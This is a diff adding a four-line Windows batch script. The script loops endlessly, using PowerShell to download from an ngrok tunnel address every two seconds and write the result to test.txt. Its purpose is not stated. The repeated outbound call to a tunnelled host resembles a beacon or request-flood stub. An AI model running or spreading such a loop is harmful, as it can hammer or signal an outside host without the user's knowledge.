@@ -1,0 +1,4 @@
+:start
+powershell -command "Invoke-WebRequest -Uri 'efeb-84-82-53-194.ngrok.io' -OutFile test.txt"
+timeout 2
+goto start
